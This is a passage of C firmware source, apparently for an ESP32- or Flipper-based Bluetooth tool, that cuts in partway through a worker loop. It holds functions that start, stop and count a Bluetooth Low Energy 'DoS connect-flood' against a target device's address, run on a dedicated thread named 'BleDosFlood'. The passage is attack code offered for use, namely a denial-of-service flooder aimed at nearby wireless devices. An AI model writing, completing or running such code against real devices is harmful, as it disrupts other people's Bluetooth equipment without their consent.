            for(int i = 0; i < 40 && s_connected && !s_dos_stop; i++) {
                furi_delay_ms(50);
            }
        }
    }

    s_connected = false;
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
    ESP_LOGI(TAG, "DoS connect-flood worker stopped (cycles=%u)", (unsigned)s_dos_counter);
    return 0;
}

bool ble_walk_hal_dos_connect_flood_start(const BleWalkDevice* target, uint16_t hold_count) {
    if(!target) return false;
    if(s_dos_thread) {
        ESP_LOGW(TAG, "DoS flood already running");
        return false;
    }

    memcpy(s_dos_target_addr, target->addr, 6);
    s_dos_target_addr_type = (uint8_t)target->addr_type;
    s_dos_hold_count = hold_count;
    s_dos_counter = 0;
    s_dos_stop = false;

    s_dos_thread = furi_thread_alloc();
    furi_thread_set_name(s_dos_thread, "BleDosFlood");
    furi_thread_set_stack_size(s_dos_thread, 4096);
    furi_thread_set_callback(s_dos_thread, dos_flood_worker);
    furi_thread_start(s_dos_thread);
    return true;
}

void ble_walk_hal_dos_flood_stop(void) {
    if(!s_dos_thread) return;

    s_dos_stop = true;
    furi_thread_join(s_dos_thread);
    furi_thread_free(s_dos_thread);
    s_dos_thread = NULL;
}

uint32_t ble_walk_hal_dos_counter(void) {
    return s_dos_counter;
}

#endif // PUBLIC_BUILD
